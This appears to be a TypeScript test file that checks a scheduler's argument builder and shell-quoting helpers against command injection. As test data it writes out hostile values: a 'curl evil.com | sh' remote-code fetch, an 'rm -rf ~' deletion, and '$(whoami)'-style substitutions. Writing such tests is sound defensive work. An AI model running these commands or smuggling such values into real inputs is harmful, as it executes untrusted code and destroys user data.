import test from 'node:test';
import assert from 'node:assert/strict';

import { buildScheduleArgs } from '../src/domain/schedule/schedule';
import { posixQuote, quoteArgvForShell } from '../src/domain/shell/quoting';

const EVIL = 'x"; curl evil.com/sh | sh; echo "';

test('buildScheduleArgs returns argv array, not a shell string', () => {
  /* Given */
  const schedule = { cli: { model: 'sonnet-4-6', 'allowed-tools': 'Read,Bash' } };

  /* When */
  const claudeArgs = buildScheduleArgs('session-123', schedule);

  /* Then */
  assert.ok(Array.isArray(claudeArgs));
  assert.ok(claudeArgs.includes('--resume'));
  assert.ok(claudeArgs.includes('session-123'));
  assert.ok(claudeArgs.includes('--model'));
  assert.ok(claudeArgs.includes('sonnet-4-6'));
});

test('buildScheduleArgs preserves injection attempts as literal argv tokens (no shell interpretation)', () => {
  /* Given */
  const schedule = { cli: { model: EVIL } };

  /* When */
  const claudeArgs = buildScheduleArgs('sess', schedule);

  /* Then */
  const idx = claudeArgs.indexOf('--model');
  assert.ok(idx >= 0);
  // The evil string is a single argv token — no splitting, no interpretation.
  assert.equal(claudeArgs[idx + 1], EVIL);
});

test('buildScheduleArgs rejects max-budget-usd that is not a number', () => {
  /* When */
  const act = () => buildScheduleArgs('sess', { cli: { 'max-budget-usd': '1; rm -rf ~' } });

  /* Then */
  assert.throws(act, /max-budget-usd/);
});

test('buildScheduleArgs rejects control characters in scalar fields', () => {
  /* When */
  const act = () => buildScheduleArgs('sess', { cli: { model: 'foo\x00bar' } });

  /* Then */
  assert.throws(act, /unsafe characters/);
});

test('buildScheduleArgs allows newlines in append-system-prompt', () => {
  /* Given */
  const withNewlines = 'line 1\nline 2\nline 3';

  /* When */
  const claudeArgs = buildScheduleArgs('sess', { cli: { 'append-system-prompt': withNewlines } });

  /* Then */
  const idx = claudeArgs.indexOf('--append-system-prompt');
  assert.equal(claudeArgs[idx + 1], withNewlines);
});

test('buildScheduleArgs rejects control chars in append-system-prompt', () => {
  /* When */
  const act = () => buildScheduleArgs('sess', { cli: { 'append-system-prompt': 'bad\x01stuff' } });

  /* Then */
  assert.throws(act, /unsafe characters/);
});

test('posixQuote neutralizes bash injection', () => {
  /* When */
  const quoted = posixQuote(EVIL);

  /* Then */
  // Single-quoted, so the shell passes the whole thing as one arg.
  assert.ok(quoted.startsWith("'"));
  assert.ok(quoted.endsWith("'"));
});

test('posixQuote escapes single quotes in the value', () => {
  /* When */
  const withQuote = posixQuote("it's");

  /* Then */
  // Single quotes in the value are escaped as '\''
  assert.equal(withQuote, "'it'\\''s'");
});

test('posixQuote handles backticks and $() — these must not be evaluated', () => {
  /* Given */
  const cases: Array<[string, string]> = [
    ['`whoami`', "'`whoami`'"],
    ['$(id)', "'$(id)'"],
  ];

  for (const [evil, expected] of cases) {
    /* When */
    const quoted = posixQuote(evil);

    /* Then */
    assert.equal(quoted, expected);
  }
});

test('quoteArgvForShell joins multiple args with spaces, each safely quoted', () => {
  /* When */
  const joined = quoteArgvForShell(['--model', 'x"; evil', '--flag']);

  /* Then */
  assert.equal(joined, "'--model' 'x\"; evil' '--flag'");
});

test('full simulated schedule command is safe under a malicious frontmatter', () => {
  /* Given */
  const evilSchedule = {
    cli: {
      'permission-mode': 'acceptEdits',
      model: 'x"; curl evil.com | sh; echo "',
      'allowed-tools': 'Bash,Read',
      'append-system-prompt': '$(whoami)',
      'add-dirs': '/tmp,/etc; touch /tmp/pwned',
    },
  };

  /* When */
  const cmd = 'claude ' + quoteArgvForShell(buildScheduleArgs('sess-id', evilSchedule));

  /* Then */
  // Walk the command and extract only the text outside single-quoted tokens.
  // If any shell metacharacter appears in that "outside" text, injection leaked.
  let outside = '';
  let inQuote = false;
  for (let i = 0; i < cmd.length; i++) {
    const c = cmd[i];
    if (c === "'") { inQuote = !inQuote; continue; }
    if (!inQuote) outside += c;
  }
  // Outside of quoted tokens we should only see: `claude`, spaces, and at most the
  // `\` from the POSIX `'\''` escape (which is always immediately re-enters a quote).
  assert.ok(!/curl/.test(outside), `curl leaked outside quotes: "${outside}"`);
  assert.ok(!/whoami/.test(outside), `whoami leaked outside quotes: "${outside}"`);
  assert.ok(!/touch/.test(outside), `touch leaked outside quotes: "${outside}"`);
  assert.ok(!/[;|&`$]/.test(outside), `shell metachar leaked outside quotes: "${outside}"`);
  // Argv tokens survive as single-quoted strings.
  assert.ok(cmd.includes(`'x"; curl evil.com | sh; echo "'`), `expected quoted model arg in: ${cmd}`);
});
